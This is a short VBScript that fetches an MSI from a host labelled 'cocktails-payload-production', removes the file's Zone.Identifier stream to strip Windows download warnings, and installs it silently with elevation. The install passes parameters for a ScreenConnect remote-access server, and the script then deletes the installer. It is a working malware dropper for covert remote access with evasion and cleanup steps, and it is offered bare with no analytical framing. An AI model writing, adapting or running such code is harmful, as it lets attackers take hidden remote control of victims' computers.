Option Explicit

Dim shell, fso, url, localPath, zoneIdPath, http, stream, file, objShellApp
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
zoneIdPath = localPath & ":Zone.Identifier"

On Error Resume Next

' DOWNLOAD USING WINHTTP
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.SetTimeouts 30000, 60000, 120000, 180000
http.Open "GET", url, False
http.Send

If Err.Number = 0 And http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Mode = 3
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile localPath, 2
    stream.Close
    
    If fso.FileExists(zoneIdPath) Then
        fso.DeleteFile zoneIdPath, True
    End If
    
    If fso.FileExists(localPath) Then
        Set file = fso.GetFile(localPath)
        If file.Size > 1000000 Then
            ' SILENT INSTALL WITH ELEVATION + ALL REQUIRED PROPERTIES
            Set objShellApp = CreateObject("Shell.Application")
            objShellApp.ShellExecute "msiexec.exe", "/i """ & localPath & """ /qn /norestart ACCEPTEULA=1 ALLUSERS=1 SC_HOST=optonline38.screenconnect.com SC_PORT=443", "", "runas", 0
            
            ' WAIT FOR INSTALL TO COMPLETE
            WScript.Sleep 60000
            
            ' CLEANUP
            If fso.FileExists(localPath) Then
                fso.DeleteFile localPath, True
            End If
        End If
    End If
End If

WScript.Quit 0